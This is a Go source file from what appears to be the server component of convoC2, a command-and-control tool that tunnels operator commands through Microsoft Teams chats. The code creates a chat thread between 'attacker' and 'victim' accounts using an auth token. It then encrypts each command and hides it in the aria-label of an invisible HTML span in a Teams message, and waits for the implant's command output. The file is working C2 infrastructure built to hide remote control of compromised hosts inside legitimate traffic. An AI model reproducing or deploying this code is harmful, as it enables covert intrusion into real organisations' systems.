package server

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/cxnturi0n/convoC2/pkg/crypto"
)

var MsgTimeout int

// https://teams.microsoft.com/api/chatsvc/emea/v1/users/ME/conversations/<ThreadId>/messages
const chatBaseUrl = "https://teams.microsoft.com/api/chatsvc/emea/v1/users/ME/conversations/"
const chatEndUrl = "/messages"

const createThreadUrl = "https://teams.microsoft.com/api/chatsvc/emea/v1/threads"

func ExecuteCmdPostRequestWithMessageAndCommand(chatUrl string, authToken string, message string, command string, agentID string, commandResponsesChan chan CommandResponse) (string, error) {
	bodyBytes, err := createMessageBody(message, command, agentID)
	if err != nil {
		return "", err
	}

	resp, err := sendPostRequest(chatUrl, authToken, bodyBytes)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	return getCommandResponse(commandResponsesChan)
}

func createMessageBody(message string, command string, agentID string) ([]byte, error) {
	// Encrypt and obfuscate the command
	encryptedCommand, err := crypto.Encrypt(command, agentID)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt command: %w", err)
	}

	type MessageBody struct {
		Type        string `json:"type"`
		Content     string `json:"content"`
		MessageType string `json:"messagetype"`
		ContentType string `json:"contenttype"`
	}

	// Embed the command in aria-label of hidden span tag
	content := fmt.Sprintf(`<p>%s</p><span aria-label="%s" style="display:none;"></span>`, message, encryptedCommand)

	requestBody := MessageBody{
		Type:        "Message",
		Content:     content,
		MessageType: "RichText/Html",
		ContentType: "Text",
	}

	bodyBytes, err := json.Marshal(requestBody)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request body: %w", err)
	}
	return bodyBytes, nil
}

func sendPostRequest(chatUrl string, authToken string, bodyBytes []byte) (*http.Response, error) {
	req, err := http.NewRequest("POST", chatUrl, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, fmt.Errorf("failed to create POST request: %w", err)
	}

	req.Header.Add("Authorization", authToken)
	req.Header.Add("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}

	if resp.StatusCode != http.StatusCreated {
		defer resp.Body.Close()
		return nil, fmt.Errorf("request failed: status %d", resp.StatusCode)
	}
	return resp, nil
}

func getCommandResponse(commandResponsesChan chan CommandResponse) (string, error) {
	emptyChannel(commandResponsesChan)

	select {
	case commandResponse := <-commandResponsesChan:
		cleanedOutput := cleanCommandOutput(commandResponse.Output)
		if commandResponse.Success {
			return cleanedOutput, nil
		}
		return "", fmt.Errorf("command failed: %s", cleanedOutput)

	case <-time.After(time.Duration(MsgTimeout) * time.Second):
		return "", fmt.Errorf("timeout: no response received within %d seconds", MsgTimeout)
	}
}

func emptyChannel(ch chan CommandResponse) {
	for {
		select {
		case <-ch:
		default:
			return
		}
	}
}

func CheckAuth(chatUrl string, authToken string) error {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(MsgTimeout)*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", chatUrl, nil)
	if err != nil {
		return fmt.Errorf("error creating request: %w", err)
	}
	req.Header.Add("Authorization", authToken)

	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error during request: %w", err)
	}
	defer res.Body.Close()

	if res.StatusCode == http.StatusBadRequest {
		return nil
	}

	return fmt.Errorf("authentication failed with status code: %d", res.StatusCode)
}

func createChatThread(victimId string, attackerId string, token string) (string, error) {

	requestBody := fmt.Sprintf(`
	{
		"members": [
			{"id": "%s", "role": "Admin"},
			{"id": "%s", "role": "Admin"}
		],
		"properties": {
			"threadType": "chat",
			"fixedRoster": true,
			"uniquerosterthread": true
		}
	}`, attackerId, victimId)

	req, err := http.NewRequest("POST", createThreadUrl, bytes.NewBuffer([]byte(requestBody)))
	if err != nil {
		return "", err
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	location := resp.Header.Get("Location")
	if location == "" {
		return "", fmt.Errorf("error: no location header found in the response")
	}

	// Extract the Thread Id from the Location Header
	re := regexp.MustCompile(`.*/threads/(.*)`)
	match := re.FindStringSubmatch(location)
	if len(match) < 2 {
		return "", fmt.Errorf("error: could not extract thread ID from Location header")
	}

	return match[1], nil
}

func GetChatUrl(victimId string, attackerId string, token string) (string, error) {
	threadId, err := createChatThread(victimId, attackerId, token)
	return chatBaseUrl + threadId + chatEndUrl, err
}

func cleanCommandOutput(output string) string {
	cleanedOutput := strings.ReplaceAll(output, "\r", "")
	return strings.TrimSpace(cleanedOutput)
}
